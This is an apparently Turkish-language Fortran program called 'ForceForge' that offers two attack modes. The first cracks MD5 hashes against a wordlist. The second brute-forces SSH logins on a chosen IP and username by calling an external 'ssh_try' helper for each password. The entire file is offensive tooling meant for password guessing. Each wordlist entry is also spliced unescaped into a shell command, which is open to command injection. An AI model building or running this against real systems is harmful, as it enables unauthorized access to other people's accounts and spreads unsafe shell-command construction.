program forceforge
  implicit none
  character(len=10) :: choice

  print *, "=============================="
  print *, "      [ ForceForge v1.0 ]"
  print *, "=============================="
  print *, "1) Hash Cracker (MD5)"
  print *, "2) SSH Brute-Force (Wordlist)"
  print *, "Seçiminizi girin (1/2): "
  read(*,'(A)') choice

  if (choice == "1") then
     call hash_cracker()
  else if (choice == "2") then
     call ssh_brute()
  else
     print *, "Geçersiz seçim. Çıkılıyor..."
  end if

contains

  subroutine hash_cracker()
    character(len=256) :: password, hash, command, result
    character(len=64) :: target_hash
    integer :: ios

    print *, "Hedef MD5 hash'i girin:"
    read(*,'(A)') target_hash

    open(unit=10, file="wordlist.txt", status="old")

    do
      read(10, '(A)', iostat=ios) password
      if (ios /= 0) exit

      write(command, '(A)') "echo -n '" // trim(password) // "' | md5sum > tmp.txt"
      call system(command)

      open(unit=11, file="tmp.txt", status="old")
      read(11, '(A)') result
      close(11)

      if (index(result, trim(target_hash)) > 0) then
          print *, "💥 ŞİFRE BULUNDU:", trim(password)
          exit
      else
          print *, "Denendi:", trim(password)
      end if
    end do

    close(10)
  end subroutine

  subroutine ssh_brute()
    character(len=100) :: line, command
    integer :: ios
    character(len=50) :: ip, user

    print *, "Hedef IP girin:"
    read(*,'(A)') ip
    print *, "Kullanıcı adı:"
    read(*,'(A)') user

    open(unit=10, file="wordlist.txt", status="old")

    do
      read(10, '(A)', iostat=ios) line
      if (ios /= 0) exit

      write(command, '(A)') "./ssh_try " // trim(ip) // " " // trim(user) // " " // trim(line)
      print *, "🔐 Deneme:", trim(line)
      call system(trim(command))
    end do

    close(10)
  end subroutine

end program forceforge
